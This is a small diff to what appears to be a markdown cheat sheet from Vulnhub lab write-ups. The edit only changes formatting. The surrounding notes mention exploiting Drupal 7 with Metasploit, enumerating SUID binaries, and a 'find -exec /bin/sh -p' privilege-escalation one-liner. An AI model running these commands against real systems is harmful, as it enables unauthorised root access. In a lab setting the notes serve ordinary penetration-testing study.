@@ -16,9 +16,9 @@ excerpt: "Vulnhub Hacking Boxes..."
 # Exploiting CMS Drupal 7 using msf
 # msf >  search about drupal 7 Exploits and Auxiliaries.
 ### Post Exploitation !
-SUID's Files :-
+[SUID's Files ]:-
 Awesome script for SUID Exploitation ====> suid3num.py <=====
-find / -type f -perm -4000 2>/dev/null   ====> find
+find / -type f -perm -4000 2>/dev/null   ---> find
 
 find . -exec /bin/sh -p \; -quit
 ```
